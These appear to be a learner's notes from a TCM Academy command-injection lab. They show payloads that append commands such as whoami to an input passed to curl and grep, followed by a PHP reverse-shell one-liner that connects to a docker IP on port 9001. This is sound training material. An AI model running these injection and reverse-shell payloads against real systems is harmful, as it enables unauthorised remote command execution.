![[Pasted image 20250406105931.png]]

- My payload:
	- Since it uses `grep`, our output must contain `HTTP/` for it to print, so:
		- `localhost; echo "HTTP/" $(whoami)` or
		- `;whoami;echo HTTP/`
	- ![[Pasted image 20250406113115.png]]
- TCM Academy payload
	- ==We can just fail the `curl` and `grep` command with invalid input==:
		- `;whoami;asdf`
			- ![[Pasted image 20250406113526.png]]


# Reverse Shell
---
- **==Thing to notice is the technology. We should try getting shell using the technology web server is using. Here, it is `php`==**
- `;php -r '$sock=fsockopen("172.17.0.1",9001);system("sh <&3 >&3 2>&3");';asdf`
	- Here `172.17.0.1` is **docker IP**
	- ![[Pasted image 20250406113907.png]]
